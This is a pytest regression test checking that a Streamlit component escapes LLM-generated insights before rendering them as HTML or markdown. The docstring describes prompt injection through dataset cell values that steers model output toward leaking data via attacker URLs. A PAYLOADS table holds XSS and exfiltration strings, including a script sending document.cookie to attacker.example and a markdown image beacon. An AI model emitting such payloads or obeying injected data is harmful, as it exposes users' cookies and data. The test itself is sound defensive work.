"""
Regression test for SEC-07: model output rendered as HTML/markdown unescaped.

`render_ai_insights` interpolated LLM output - which dataset content can
steer (prompt injection via cell values) - straight into
`st.markdown(..., unsafe_allow_html=True)` blocks, and into plain markdown
where `![](https://attacker/?q=...)` makes the viewer's browser fetch an
attacker URL. Every model-supplied string must now be escaped.
"""

from __future__ import annotations

import contextlib
from unittest.mock import MagicMock, patch

import pytest

from src.frontend.components import ai_insights

PAYLOADS = {
    "html_tag": '<img src=x onerror="alert(document.cookie)">',
    "script": "<script>fetch('https://attacker.example/'+document.cookie)</script>",
    "md_image": "![pixel](https://attacker.example/leak?q=revenue)",
    "md_link": "[click me](javascript:alert(1))",
    "raw_html_md": "<a href='https://attacker.example'>open</a>",
}


def _report(payload: str) -> dict:
    return {
        "executive_summary": payload,
        "key_findings": [payload],
        "business_implications": [payload],
        "risks": [payload],
        "opportunities": [payload],
        "actions": [payload],
        "narrative": payload,
        "confidence": payload,
        "limitations": [payload],
        "model": "m",
        "provider": "p",
    }


def _render(payload: str) -> list[tuple[str, bool]]:
    """Render with Streamlit mocked; return (text, unsafe_allow_html) for each markdown-like call."""
    calls: list[tuple[str, bool]] = []

    def capture(name):
        def _fn(body="", *args, **kwargs):
            calls.append((str(body), bool(kwargs.get("unsafe_allow_html", False))))

        return _fn

    def columns(spec, *args, **kwargs):
        count = spec if isinstance(spec, int) else len(spec)
        return [contextlib.nullcontext() for _ in range(count)]

    with (
        patch.object(ai_insights.st, "markdown", side_effect=capture("markdown")),
        patch.object(ai_insights.st, "write", side_effect=capture("write")),
        patch.object(ai_insights.st, "success", side_effect=capture("success")),
        patch.object(ai_insights.st, "info", side_effect=capture("info")),
        patch.object(ai_insights.st, "subheader", MagicMock()),
        patch.object(ai_insights.st, "caption", MagicMock()),
        patch.object(ai_insights.st, "divider", MagicMock()),
        patch.object(ai_insights.st, "metric", MagicMock()),
        patch.object(ai_insights.st, "columns", side_effect=columns),
        patch.object(ai_insights.st, "expander", side_effect=lambda *a, **k: contextlib.nullcontext()),
    ):
        ai_insights.render_ai_insights(_report(payload))
    return calls


@pytest.mark.parametrize("name", sorted(PAYLOADS))
def test_model_output_is_escaped_everywhere(name: str) -> None:
    payload = PAYLOADS[name]
    calls = _render(payload)

    assert calls, "nothing rendered"
    for text, unsafe_html in calls:
        # No raw tag from model output may reach the browser, in HTML blocks or markdown.
        assert "<img" not in text and "<script" not in text and "<a " not in text, (text, unsafe_html)
        # No live markdown image or link syntax either.
        assert "](" not in text, text


def test_escaped_text_is_still_present_for_the_reader() -> None:
    calls = _render("Revenue grew 12.5% & margins held")

    rendered = " ".join(text for text, _ in calls)
    assert "Revenue grew" in rendered
    assert "&amp;" in rendered or "\\&" in rendered or "&" in rendered


@pytest.mark.parametrize(
    "module_name, func_name, kwargs",
    [
        ("src.frontend.components.empty_state", "render_empty_state", {"title": "{p}", "message": "{p}"}),
        ("src.frontend.components.loading_state", "show_loading_message", {"title": "{p}", "description": "{p}"}),
    ],
)
def test_state_components_escape_their_text(module_name: str, func_name: str, kwargs: dict) -> None:
    import importlib

    module = importlib.import_module(module_name)
    func = getattr(module, func_name, None)
    if func is None:
        pytest.skip(f"{module_name}.{func_name} not present")
    payload = PAYLOADS["html_tag"]
    captured: list[str] = []

    with (
        patch.object(module.st, "markdown", side_effect=lambda body="", *a, **k: captured.append(str(body))),
        patch.object(module.st, "columns", side_effect=lambda spec, *a, **k: [contextlib.nullcontext()] * len(spec)),
        patch.object(module.st, "button", return_value=False),
    ):
        func(**{k: v.format(p=payload) for k, v in kwargs.items()})

    assert captured
    assert all("<img" not in text for text in captured), captured
